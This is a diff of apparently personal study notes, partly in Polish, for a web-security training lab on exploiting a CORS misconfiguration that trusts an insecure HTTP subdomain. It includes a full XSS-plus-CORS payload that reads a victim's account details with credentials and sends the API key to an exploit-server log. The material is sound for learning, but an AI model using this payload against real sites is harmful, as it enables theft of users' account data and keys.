@@ -25,7 +25,7 @@ ____
 
 Lab: CORS vulnerability with trusted insecure protocols
 
-
+WERYFIKACJA
 1. intercept to login
 2. burp: deshboard>audit items: AJAX request /accountDetails with Access Control Allow Credentails
 3. Repeater: resubmit it with the added header 
@@ -34,15 +34,18 @@ Origin: http://subdomain.0ad2003604a2a8e0808603ec008c0048.web-security-academy.n
 Access-Control-Allow-Origin: http://subdomain.0ad2003604a2a8e0808603ec008c0048.web-security-academy.net
 Access-Control-Allow-Credentials: true
 
-
-
-5/Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.
+EXPLOITACJA
+5.Open a product page > Check stock > nowe okno loaded using a HTTP URL on a subdomain.
 Observe that the productID parameter is vulnerable to XSS.
 
-In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
+PYALOAD on the exploit server
+
 <script>
     document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
-Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
-Go back to the exploit server and click Deliver exploit to victim.
-Click Access log, retrieve and submit the victim's API key to complete the lab. 
+
+6. Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+7. Go back to the exploit server and click Deliver exploit to victim.
+8. Click Access log, retrieve and submit the victim's API key to complete the lab. 
+
+
